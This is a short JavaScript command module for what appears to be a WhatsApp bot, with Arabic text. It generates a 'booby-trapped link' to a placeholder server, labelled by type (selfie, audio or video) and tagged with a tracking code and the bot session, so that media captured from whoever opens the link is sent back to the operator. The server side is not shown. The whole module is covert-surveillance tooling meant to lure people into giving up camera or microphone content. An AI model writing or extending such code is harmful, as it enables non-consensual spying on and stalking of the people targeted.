const crypto = require('crypto');

module.exports = {
    name: 'صيدة',
    aliases: ['فخ', 'trap', 'سيلفي'],
    category: 'استخبارات',
    execute: async ({ reply, sender, sessionId, args }) => {
        
        // إذا لم يكتب نوع الفخ، سيكون الافتراضي (سيلفي)
        const validTypes = ['selfie', 'audio', 'video'];
        const requestedType = args[0] ? args[0].toLowerCase() : 'selfie';

        if (!validTypes.includes(requestedType)) {
            return reply(`⚠️ ╟ *نَوْعُ الفَخِّ غَيْرُ مَعْرُوف!*\n📌 ╟ الأَنْوَاعُ المُتَاحَة: (selfie, audio, video)\nمِثَال: *.صيدة audio*`);
        }

        const trapId = crypto.randomBytes(4).toString('hex');
        const targetNum = sender.split('@')[0];
        
        // ⚠️ ضَعْ رَابِطَ السِّيرْفَر هُنَا (يجب أن يبدأ بـ https)
        const yourDomain = "https://your-server.com"; 
        
        // الرابط الذكي يحمل اسم الجلسة لكي يعرف السيرفر لمن يرسل الصور
        const trapLink = `${yourDomain}/trap/${requestedType}?id=${trapId}&target=${targetNum}&session=${sessionId}`;

        const msg = `❖ ════ 🎭 ﴿ شَرَكُ النُّخْبَة ﴾ 🎭 ════ ❖\n\n` +
                    `🎯 ╟ نوع الفخ: [ *${requestedType.toUpperCase()}* ]\n\n` +
                    `🔗 ╟ *الرَّابِطُ المُلَغَّم:*\n` +
                    `${trapLink}\n\n` +
                    `🔖 ╟ *كُودُ التَّتَبُّع:* ${trapId}\n\n` +
                    `❖ ════════════════════════ ❖`;
                    
        await reply(msg);
    }
};
